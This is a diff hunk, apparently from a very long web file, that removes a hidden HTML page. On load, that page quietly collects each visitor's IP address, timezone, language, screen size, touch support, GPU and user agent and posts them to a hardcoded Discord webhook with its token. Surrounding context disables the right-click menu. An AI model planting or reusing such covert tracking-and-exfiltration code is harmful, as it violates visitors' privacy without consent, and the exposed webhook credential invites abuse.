@@ -95850,124 +95850,69 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 
 
-<!DOCTYPE html>
-<html>
-<head>
-  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-  <script type="text/javascript">
-    $(document).ready(function() {   // Waits for page to load completely
 
-      // Function to post data to Discord webhook
-      function postData(webhookUrl, data) {
-        $.ajax({
-          url: webhookUrl,
-          type: 'POST',
-          contentType: 'application/json',
-          data: JSON.stringify(data)
-        });
-      }
 
-      // Function to get the user's IP address
-      function getClientIP()
-      {
-        return fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => data.ip)
-          .catch(error => console.error('Error:', error));
-      }
 
-      // Function to get the user's timezone offset
-      function getClientTimezoneOffset()
-      {
-        return new Date().getTimezoneOffset();
-      }
 
-      // Function to get the user's language
-      function getClientLanguage()
-      {
-        return navigator.language || navigator.userLanguage;
-      }
 
-      // Function to get the user's screen size
-      function getClientScreenSize()
-      {
-        return {
-          width: window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
-          height: window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
-        };
-      }
 
-      // Function to check if user has touch screen
-      function hasTouchScreen()
-      {
-        return ('ontouchstart' in window) || (navigator.msMaxTouchPoints > 0);
-      }
 
-      // Function to get the user's GPU information
-      function getClientGPU()
-      {
-        var canvas = document.createElement('canvas');
-        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo && gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
 
-      // Function to get the user agent string
-      function getUserAgent()
-      {
-        return navigator.userAgent;
-      }
 
-      // Send fetched data with Discord webhook
-      function sendFetchedData() {
-        var webhookUrl = 'https://discord.com/api/webhooks/1181563871488651274/TbA4Qd5tj3XzMj6R0vJ1TUX-CK_2yQYX6nWnHWsqoVAa82oeNIEaVfMdem-qk00dY7yk'; 
 
-        // Gather all the fetched data
-        var data = {
-          ip: '',
-          timezoneOffset: '',
-          language: '',
-          screenSize: {},
-          hasTouchScreen: false,
-          gpu: '',
-          userAgent: ''
-        };
 
-        // Get user's IP address
-        getClientIP().then(function(ip) {
-          data.ip = ip;
 
-          // Get user's timezone offset
-          data.timezoneOffset = getClientTimezoneOffset();
 
-          // Get user's language
-          data.language = getClientLanguage();
 
-          // Get user's screen size
-          data.screenSize = getClientScreenSize();
 
-          // Check if user has touch screen
-          data.hasTouchScreen = hasTouchScreen();
 
-          // Get user's GPU
-          data.gpu = getClientGPU();
 
-          // Get user agent string
-          data.userAgent = getUserAgent();
 
-          // Send the data via Discord webhook
-          postData(webhookUrl, data);
-        });
-      }
 
-      // Call the function when the page loads
-      sendFetchedData();
-    });
-  </script>
-</head>
-<body>
-</body>
-</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
